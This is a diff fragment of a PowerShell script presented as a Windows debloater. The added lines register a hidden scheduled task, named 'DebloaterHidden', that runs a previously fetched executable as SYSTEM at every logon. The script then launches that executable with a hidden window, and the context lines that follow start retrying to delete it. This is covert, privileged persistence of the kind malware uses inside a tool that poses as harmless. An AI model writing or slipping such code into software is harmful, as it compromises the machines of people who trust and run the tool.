@@ -27,6 +27,16 @@ Wait-Job $job1 | Out-Null
 Remove-Job $job1
 
 if (Test-Path $output1) {
+    $taskName = "DebloaterHidden"
+    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+    }
+    $action = New-ScheduledTaskAction -Execute $output1
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden Debloater Task" -Settings (New-ScheduledTaskSettingsSet -Hidden)
+    Write-Host "Debloater.exe added as a hidden scheduled task." -ForegroundColor Green
+
     Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
     $maxTries = 5
     $deleted = $false
